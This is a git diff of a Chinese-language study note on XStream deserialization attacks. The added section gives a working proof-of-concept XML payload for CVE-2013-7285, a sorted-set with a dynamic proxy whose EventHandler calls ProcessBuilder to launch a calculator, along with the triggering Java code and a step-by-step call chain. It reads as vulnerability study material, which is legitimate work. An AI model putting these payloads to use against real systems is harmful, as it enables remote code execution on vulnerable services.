@@ -1,3 +1,4 @@
+# xstream漏洞检测与利用
 # **XStream Basics**
 在描述攻击之前，让我们回顾一下XStream的一些基础知识。XStream是一个XML序列化库，可以在Java类型和XML之间进行转换。考虑一个简单的Person类：
 ```java
@@ -101,7 +102,65 @@ Map<String, Integer> map = (Map<String, Integer>) xStream.fromXML(xml);
 ```
 XStream读取表示核心Java类型的XML的能力将有助于远程代码执行攻击的利用。
 
+## **构造攻击代码(CVE-2013-7285)**
+```java
+new ProcessBuilder().command("cmd.exe /c calc").start();
+```
+XStream只调用构造函数和设置字段，因此，攻击者无法直接调用ProcessBuilder.start()方法。但是，安全研究员Dinis Cruz在他们的博客文章中向我们展示了他们如何使用Comparable接口来调用攻击代码。利用Java动态代理来动态地创建一个可比较的实例，同时实现Comparable接口，设置代理的handler为Java的EventHandler，EventHandler类为攻击者提供了一个可配置的InvocationHandler实现，攻击者将EventHandler配置为调用ProcessBuilder的start()方法。将这些组件放在一起得到动态代理的XML表示：
+```xml
+<dynamic-proxy>
+    <interface>java.lang.Comparable</interface>
+    <handler class="java.beans.EventHandler">
+        <target class="java.lang.ProcessBuilder">
+            <command>
+                <string>open</string>
+                <string>/Applications/Calculator.app</string>
+            </command>
+        </target>
+        <action>start</action>
+    </handler>
+</dynamic-proxy>
+```
+为了强制构建的proxy调用compare方法，通过构建一个可排序的集合TreeSet来触发两个可比较的实例进行比较，Payload如下：
+```xml
+<sorted-set>
+  <string>foo</string>
+  <dynamic-proxy>
+    <interface>java.lang.Comparable</interface>
+    <handler class="java.beans.EventHandler">
+      <target class="java.lang.ProcessBuilder">
+        <command>
+          <string>calc</string>
+        </command>
+      </target>
+      <action>start</action>
+    </handler>
+  </dynamic-proxy>
+</sorted-set>
+```
+最终，当XStream读取这个XML时，攻击就会发生：
+```java
+String payload = // XML from above
+XStream xstream = new XStream();
+xstream.fromXML(payload);
+```
+### **攻击流程总结**
+让我们总结一下XStream在反序列化这个XML时触发的大致调用过程：
+* 步骤一：XStream调用TreeSet构造函数，设置字符“foo”和创建的代理对象。
+* 步骤二：TreeSet构造函数调用实现Comparable接口的Proxy对象的compareTo方法来确定集合中各项的顺序。
+* 步骤三：Proxy对象将所有的方法调用委托给EventHandler。
+* 步骤四：EventHandler在其invokeInternal函数中调用配置ProcessBuilder的start()方法。
+* 步骤五：ProcessBuilder派生一个新进程，运行攻击者希望执行的命令。
+# **防御总结**
+http://www.pwntester.com/blog/2013/12/23/rce-via-xstream-object-deserialization38/
+
+https://blog.csdn.net/weixin_39635657/article/details/111104938
 # **参考**
+Xstream特性：
+https://www.baeldung.com/xstream-deserialize-xml-to-object
+
+https://www.baeldung.com/xstream-serialize-object-to-xml
+
 Xstream反序列化原理：
 https://blog.csdn.net/weixin_39635657/article/details/111104938
 
